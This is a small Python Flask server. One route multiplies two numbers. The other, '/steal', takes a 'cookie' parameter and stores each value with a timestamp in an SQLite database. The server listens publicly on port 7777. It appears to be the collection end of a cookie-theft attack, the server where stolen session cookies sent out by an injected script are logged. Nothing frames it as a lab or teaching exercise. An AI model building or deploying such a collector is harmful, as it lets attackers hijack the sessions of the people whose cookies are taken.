import flask, json
import sqlite3
import datetime

app = flask.Flask(__name__)


@app.route('/index', methods=['get', 'post'])
def index():
    one = flask.request.values.get('one')
    two = flask.request.values.get('two')
    try:
        a = float(one)
        b = float(two)
        num = a * b
        res = {'sum': num, 'code': 200}
        return json.dumps(res, ensure_ascii=False)
    except Exception as e:
        res = {'sum': "输入类型不对", 'code': 500}
        return json.dumps(res, ensure_ascii=False)


@app.route('/steal', methods=['get', 'post'])
def steal_cookie():
    nowTime = datetime.datetime.now()
    cookie = flask.request.values.get('cookie')
    if cookie is None:
        res = {'data': "缺少必要参数", 'code': 401}
        return json.dumps(res, ensure_ascii=False)
    elif cookie == '':
        res = {'data': "参数信息不能为空", 'code': 402}
        return json.dumps(res, ensure_ascii=False)
    else:
        try:
            conn = sqlite3.connect("Luoyc.db")
            c = conn.cursor()
            sql = "INSERT INTO tb_cookie VALUES(?,?)"
            datas = [(cookie, nowTime)]
            c.executemany(sql, datas)
            conn.commit()
            res = {'data': cookie, 'code': 200}
            return json.dumps(res, ensure_ascii=False)
        except Exception as e:
            print(e)
        finally:
            conn.close()


if __name__ == "__main__":
    app.run(port=7777, debug=False, host='0.0.0.0')
    # nohup python3 run.py >>  ./run.log 2>&1 &